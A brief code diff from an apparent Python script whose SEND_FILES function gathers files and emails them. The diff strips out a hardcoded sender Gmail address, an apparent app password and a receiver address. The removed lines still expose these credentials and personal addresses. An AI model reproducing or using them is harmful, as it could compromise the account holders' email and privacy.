@@ -34,9 +34,9 @@ def SEND_FILES():
     GET_FILES()
     # print(FILES)
 
-    EMAIL_SENDER = "abdulkarimmaslouk4@gmail.com"
-    EMAIL_PASSWORD = "uzeikxfcxjejpxmu"
-    EMAIL_RECEIVER = "musaadrar9@gmail.com"
+    EMAIL_SENDER = ""
+    EMAIL_PASSWORD = ""
+    EMAIL_RECEIVER = ""
 
     SUBJECT = "Some files"
     BODY = "Files you requested"
